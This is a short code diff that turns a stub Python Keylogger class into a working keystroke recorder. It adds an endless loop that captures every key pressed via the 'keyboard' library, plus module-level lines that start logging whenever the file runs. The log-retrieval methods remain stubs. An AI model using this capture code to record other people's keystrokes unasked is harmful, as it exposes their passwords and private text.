@@ -1,3 +1,4 @@
+import keyboard
 from keys import Keyboard
 
 class Keylogger:
@@ -11,8 +12,8 @@ class Keylogger:
 
 
 	def runner(self):
-		# run the program
-		pass
+		while True:
+			self._keyboard.add(keyboard.read_key())
 
 
 	def get_log(self, day=None):
@@ -23,3 +24,7 @@ class Keylogger:
 	def get_interval_log(self, start, end):
 		# returns log of interval in JSON format
 		pass
+
+# For tests
+logger = Keylogger()
+logger.runner()
